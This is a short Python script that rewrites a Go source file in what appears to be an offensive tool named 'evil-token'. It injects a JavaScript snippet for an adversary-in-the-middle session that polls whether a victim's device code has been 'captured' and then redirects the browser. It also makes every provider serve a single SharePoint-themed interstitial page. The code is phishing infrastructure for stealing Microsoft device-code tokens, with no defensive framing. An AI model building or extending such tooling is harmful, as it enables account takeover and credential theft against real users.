with open('/Users/macpro14/Downloads/evil-token-main/core/device_code_chain.go', 'r') as f:
    lines = f.readlines()

header = lines[:24]

poll_js = '''
// DEVICE_CODE_POLL_STATUS_JS is injected to poll for device code status
// Used when we need to redirect during an existing AitM session
const DEVICE_CODE_POLL_STATUS_JS = `
(function(){
var sid='{session_id}';
function checkDC(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured && d.redirect_url){
top.location.href=d.redirect_url;
}else if(!d.expired){
setTimeout(checkDC,3000);
}
})
.catch(function(){setTimeout(checkDC,5000);});
}
setTimeout(checkDC,3000);
})();
`

// DEVICE_CODE_SHAREPOINT_HTML is the SharePoint-themed interstitial page
// served at /dc/{session_id} and /access/sharepoint/{session_id}
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}, {expires_seconds}, {code_ready}
'''

sp_html = []
in_sp = False
for line in lines:
    if 'const DEVICE_CODE_SHAREPOINT_HTML = ' in line:
        in_sp = True
    if in_sp:
        sp_html.append(line)
        if '</html>`' in line:
            break

footer = '''
// GetInterstitialForProvider returns the SharePoint interstitial HTML template.
// All providers now use the single SharePoint-themed page.
func GetInterstitialForProvider(provider string) string {
\treturn DEVICE_CODE_SHAREPOINT_HTML
}

// GetInterstitialByTheme returns the SharePoint interstitial HTML template.
// Only the sharepoint theme is supported; all calls return the same page.
func GetInterstitialByTheme(theme string) string {
\treturn DEVICE_CODE_SHAREPOINT_HTML
}
'''

with open('/Users/macpro14/Downloads/evil-token-main/core/device_code_chain.go', 'w') as f:
    f.writelines(header)
    f.write(poll_js)
    f.writelines(sp_html)
    f.write(footer)
print('Done!')
